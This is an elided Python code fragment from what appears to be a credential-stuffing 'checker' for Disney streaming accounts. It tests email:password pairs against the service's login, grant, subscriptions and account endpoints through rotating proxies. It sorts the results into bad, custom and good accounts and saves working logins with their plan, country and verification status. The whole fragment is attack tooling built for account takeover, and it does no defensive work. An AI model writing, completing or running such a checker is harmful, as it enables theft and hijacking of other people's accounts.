        ...
        try:
            ...
            with Session() as s:
                ...
                if '"operations":["Register"]' in r.text:
                    ...
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Disney")
                    save(
                        "Disney",
                        "custom",
                        Checker.time,
                ...
                if (
                    "Bad credentials sent for" in r.text
                    or "is not a valid email Address at /email" in r.text
                    or "idp.error.identity.bad-credentials" in r.text
                ):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                ...
                r = s.post(
                    "https://global.edge.bamgrid.com/accounts/grant",
                    json=payload,
                    headers=headers,
                )
                ...
                r = s.get(
                    "https://global.edge.bamgrid.com/subscriptions", headers=headers
                )
                if r.text == "[]" or (
                    '"isActive":false' in r.text and '"isActive":true' not in r.text
                ):
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Disney")
                ...
                r = s.get(
                    "https://global.edge.bamgrid.com/accounts/me", headers=headers
                )
                ...
                if not Checker.cui:
                    log("good", ":".join([email, password]), "Disney")
                save(
                    "Disney",
                    "good",
                    Checker.time,
                    ":".join([email, password])
                    + f" | Plan: {plan} | Country: {country} | Verified: {verified}",
                )
                return_proxy(proxy)
                Checker.good += 1
                return
